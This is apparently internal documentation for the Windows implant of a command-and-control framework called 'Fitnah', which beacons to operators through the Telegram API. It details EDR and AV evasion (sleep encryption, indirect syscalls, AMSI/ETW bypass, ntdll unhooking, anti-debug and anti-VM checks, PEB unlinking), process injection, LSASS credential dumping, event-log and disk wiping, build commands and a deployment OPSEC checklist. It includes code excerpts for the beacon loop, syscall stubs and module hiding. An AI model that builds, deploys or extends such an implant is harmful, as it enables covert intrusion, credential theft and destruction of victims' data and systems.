# Implant Internals

Architecture and implementation details for the C99 Windows implant.

---

## Overview

The implant is a C99 program compiled with mingw-w64. It runs a beacon loop that:

1. Waits `sleep ± jitter` seconds
2. Sends a `CHECKIN` JSON message to the C2 via the active transport
3. Receives pending tasks from the server response
4. Executes each task through `cmd_dispatch()`
5. Sends an `ACK` with output back to the operator
6. Applies sleep obfuscation during the wait

---

## Directory Layout

```
implant/
  fitnah_implant.c           Main entry (WinMain), beacon loop
  agent.py                   Python beacon loop (alternative to C implant)
  reflective_loader.c        Reflective DLL loader (no LoadLibrary)
  process_hollowing.c        Process hollowing implementation
  core/
    beacon.py                Python beacon logic
    crypto.py                AES-256-GCM Python-side crypto
    task_queue.py            In-memory task queue
  src/
    utils.c / utils.h        base64, JSON helpers
    http.c / http.h          WinINet HTTPS to api.telegram.org
    crypto.c / crypto.h      BCrypt AES-256-GCM
    bypass.c / bypass.h      AMSI + ETW patches
    commands.c / commands.h  command dispatch
  syscall/
    direct_syscall.c         Hell's Gate + Halo's Gate SSN resolution (278 lines)
  asm/
    syscalls.asm             x64 syscall stubs
  injection/
    process_mirror.c         NtCreateSection / NtMapViewOfSection
    rdi_loader.c             Reflective DLL injection loader
    code_cave.c              Code cave injection
  evasion/
    sleep_obfuscation.c      Ekko-style RC4 .text encryption during sleep
    anti_analysis.c          Anti-debug, anti-VM, PEB unlinking, timestomp
    memory_patcher.c         In-memory AMSI/ETW patch (byte-level)
    unhook.c                 Module unhooking (fresh .text from disk)
  loader/
    advanced_loader.c        Staged shellcode loader
    bof_loader.c             BOF/COFF in-process executor
  dropper/
    advanced_dropper.c       Staged dropper
  collection/
    lsass_dump.c             LSASS dump via direct syscalls
  exploits/
    cve_exploits.c           Win32k exploit primitives
  impact/
    artifact_wipe.c          Forensic artifact wiper
    disk_wipe.c              Disk wipe
  commands/
    exec.py, ps.py, info.py, screenshot.py, upload.py, download.py
```

---

## Beacon Loop

```c
// fitnah_implant.c (simplified)
int WinMain(...) {
    AntiAnalysis_Init();       // anti-debug, anti-VM checks
    PEB_Unlink();              // hide from InLoadOrderLinks
    ClearPEHeaders();          // wipe DOS + NT headers from memory

    while (1) {
        DWORD sleep_ms = calc_jitter(FITNAH_SLEEP * 1000, FITNAH_JITTER);
        SleepObfuscate(sleep_ms);   // encrypt .text, sleep, decrypt

        char *checkin = build_checkin_json();
        char *response = http_send(FITNAH_BOT_TOKEN, FITNAH_CHAT_ID, checkin);

        Task *tasks = parse_tasks(response);
        for (int i = 0; tasks[i]; i++) {
            char *output = cmd_dispatch(tasks[i]);
            http_send_ack(tasks[i]->id, output);
        }
    }
}
```

---

## Evasion Techniques

### Sleep Obfuscation (Ekko-style)

`evasion/sleep_obfuscation.c` — during every sleep interval:

1. Walk the PE headers to find the `.text` section
2. RC4-encrypt the entire `.text` section using `SystemFunction032` (advapi32.dll — already loaded)
3. Call `WaitForSingleObject` for the sleep duration
4. RC4-decrypt `.text` with the same key

Result: memory scanners scanning during sleep see encrypted garbage where the implant's code was. No injected shellcode pattern visible.

### Indirect Syscalls — Hell's Gate + Halo's Gate

`syscall/direct_syscall.c` — SSN (System Service Number) resolution:

**Hell's Gate:** Walk the export table of `ntdll.dll` in memory. For each `Nt*` function, read the first 5 bytes. If they match the clean stub pattern (`mov r10, rcx; mov eax, <SSN>`), extract the SSN.

**Halo's Gate:** If the first bytes are hooked (e.g. a `jmp` instruction placed by EDR), scan adjacent functions in the export table (+/- 32 entries) and derive the SSN by arithmetic offset from a clean neighbor.

The `syscalls.asm` stubs execute the syscall instruction pointing into ntdll's address range (not the implant's) so address-based telemetry attributes it to ntdll.

```asm
; syscalls.asm excerpt
NtAllocateVirtualMemory_stub:
    mov r10, rcx
    mov eax, [SSN_NtAllocateVirtualMemory]   ; resolved at runtime
    jmp do_syscall

do_syscall:
    syscall
    ret
```

### Hardware Breakpoint AMSI/ETW Bypass

`evasion/bypass.c` (also available as the `hardware_breakpoints` plugin):

- Dr0 → `AmsiScanBuffer` — returns AMSI_RESULT_CLEAN on every scan
- Dr1 → `EtwEventWrite` — always returns ERROR_SUCCESS without writing
- Dr2 → `NtTraceEvent` — same
- VEH (Vectored Exception Handler) intercepts the debug exception, patches the context registers, resumes execution

**Why hardware breakpoints?** Zero bytes changed in memory — page hash scanners and memory integrity monitors see the original function bytes. The breakpoint is a CPU register state, invisible to memory scanners.

### Module Unhooking

`evasion/unhook.c`:

1. Open `C:\Windows\System32\ntdll.dll` from disk via `NtOpenFile` (direct syscall)
2. Map a clean copy into memory (`NtCreateSection` / `NtMapViewOfSection`)
3. Walk the PE headers of the in-memory ntdll
4. Overwrite the hooked `.text` section with bytes from the clean disk copy
5. Unmap the clean copy

Result: all EDR hooks in ntdll are removed. Must run before any sensitive operations.

### Anti-Debug

`evasion/anti_analysis.c`:

| Check | API Used |
|---|---|
| `IsDebuggerPresent` | kernel32 (direct) |
| PEB `NtGlobalFlag` | PEB walk |
| NtQueryInformationProcess `ProcessDebugPort` | direct syscall |
| Timing delta | `GetTickCount64` / `QueryPerformanceCounter` |
| Heap flags (`HEAP_TAIL_CHECKING_ENABLED`) | PEB walk |
| Parent process scan | NtQueryInformationProcess ProcessBasicInformation |

### Anti-VM

| Check | Method |
|---|---|
| VMware | `cpuid` leaf 0x40000000 (`VMware` hypervisor brand) |
| VirtualBox | `cpuid` + registry key `HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions` |
| RDTSC delta | High-precision timing check — VMs have elevated RDTSC deltas |
| Process scan | `vmtoolsd.exe`, `vboxservice.exe`, `vboxtray.exe`, etc. |

### PEB Unlinking

`evasion/anti_analysis.c` — removes the implant's module from the three PEB loader lists:

```c
InLoadOrderLinks.Flink->Blink = InLoadOrderLinks.Blink;
InLoadOrderLinks.Blink->Flink = InLoadOrderLinks.Flink;
// same for InMemoryOrderLinks and InInitializationOrderLinks
```

After unlinking, tools like Process Hacker and `EnumProcessModules` cannot see the implant's DLL.

---

## Injection Techniques

| Technique | File | MITRE |
|---|---|---|
| Process mirror (NtCreateSection) | `injection/process_mirror.c` | T1055.003 |
| Reflective DLL injection | `injection/rdi_loader.c` | T1055.001 |
| Code cave injection | `injection/code_cave.c` | T1574 |
| Process hollowing | `process_hollowing.c` | T1055.012 |
| CreateRemoteThread (BOF) | BOF: `createremotethread` | T1055.001 |
| NtCreateThread (BOF) | BOF: `ntcreatethread` | T1055.001 |
| NtQueueApcThread (BOF) | BOF: `ntqueueapcthread` | T1055.004 |
| SetThreadContext (BOF) | BOF: `setthreadcontext` | T1055.003 |
| KernelCallbackTable (BOF) | BOF: `kernelcallbacktable` | T1055 |

---

## BOF Executor

`loader/bof_loader.c` — `BofExecute()`:

1. Allocate RWX memory for the COFF image
2. Parse the COFF header — relocate sections, resolve Beacon API symbols
3. Resolve imports (`GetProcAddress` for all other DLL imports)
4. Apply section relocations
5. Call the BOF entry point (`go(char *args, int len)`)
6. Capture `BeaconOutput` / `BeaconPrintf` calls into a buffer
7. Return the buffer as the task output
8. `VirtualFree` the COFF allocation

No disk touch, no child process, no COM, no WMI. The COFF executes in the current thread and returns.

---

## Crypto

`src/crypto.c` — AES-256-GCM using Windows BCrypt API:

```c
NTSTATUS Fitnah_Encrypt(
    const BYTE *key,    // 32 bytes
    const BYTE *nonce,  // 12 bytes
    const BYTE *plain, SIZE_T plain_len,
    BYTE **cipher, SIZE_T *cipher_len,
    BYTE *tag           // 16 bytes output
);
```

Uses `BCryptEncrypt` with `BCRYPT_CHAIN_MODE_GCM` — Windows-native, no OpenSSL dependency.

---

## Command Dispatch

`src/commands.c` — `cmd_dispatch()` handles all command types:

| Command | Description |
|---|---|
| `exec` / `shell` | CreateProcess with captured stdout/stderr |
| `bof` | Load and execute COFF via `BofExecute()` |
| `hwbp_init` | Install hardware breakpoints (AMSI/ETW bypass) |
| `spoof_init` | Install stack spoofer (jmp gadget + trampoline) |
| `process_hollow` | Process hollowing into target |
| `rdi_inject` | Reflective DLL injection |
| `execute_assembly` | Execute .NET assembly in-memory |
| `mem_patch` | Arbitrary memory patch |
| `wipe_artifacts` | Wipe event logs and forensic artifacts |
| `timestomp` | Copy timestamps from source to target |
| `syscall` | Direct syscall dispatch |

---

## Building the C Implant

```bash
# From the project root (not the implant directory):
builder -f exe -a <agent_id>

# Or compile directly with mingw (debug):
cd implant
make AGENT_ID=abc123 BOT_TOKEN=<token> CHAT_ID=<chat_id>
```

The `Makefile` passes agent config as preprocessor defines:

```makefile
DEFINES = -DFITNAH_BOT_TOKEN=\"$(BOT_TOKEN)\" \
          -DFITNAH_CHAT_ID=\"$(CHAT_ID)\" \
          -DFITNAH_AGENT_ID=\"$(AGENT_ID)\" \
          -DFITNAH_SLEEP=$(SLEEP) \
          -DFITNAH_JITTER=$(JITTER)
```

---

## Python Agent (Alternative)

`implant/agent.py` provides the same beacon loop in Python. Use when:
- Target has Python installed
- You need to test without compiling C
- During development

```bash
python implant/agent.py --token <BOT_TOKEN> --chat-id <CHAT_ID> --agent-id abc123
```

The Python agent supports all the same command types via subprocess dispatch. It does not support BOF execution (that requires the C implant's `BofExecute()`).

---

## OPSEC Checklist

Before deploying an implant to a target:

- [ ] Compile a fresh implant (unique binary per engagement — no two engagements share a SHA256)
- [ ] Use mTLS (`--mtls`) for HTTP beacon mode
- [ ] Set `sleep >= 30` and `jitter >= 25` for production ops
- [ ] Test anti-VM checks pass on your operator machine (`opsec` REPL command)
- [ ] Use a C2 profile matching the target's expected traffic (`--profile jquery`)
- [ ] Verify redirector is in place before delivering the implant
- [ ] Code-sign the EXE if SmartScreen/MOTW is a concern (`--sign`)
